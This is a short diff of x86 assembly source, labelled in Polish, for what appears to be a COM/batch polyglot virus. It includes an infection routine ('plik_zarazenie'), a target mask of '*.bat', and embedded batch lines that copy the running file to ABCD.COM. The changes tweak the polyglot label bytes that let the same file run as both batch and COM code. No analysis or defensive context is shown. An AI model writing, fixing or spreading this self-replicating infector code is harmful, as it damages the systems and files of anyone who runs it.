@@ -18,7 +18,7 @@ PLIK_POCZATEK_ADRES equ 100h
 org 100h
 
 start:
-  db ':'
+  db ': '
   jmp plik_zarazenie
   db 13, 10, '@echo off'
   db 13, 10, 'copy %0 ABCD.COM > NUL'
@@ -70,7 +70,5 @@ plik_zarazenie_koniec:
   
 bufor dw 0
 plik_maska db '*.bat', 0h
-
+  db 13, 10, ':x'
 koniec:
-  db 13, 10, ":x"
-  
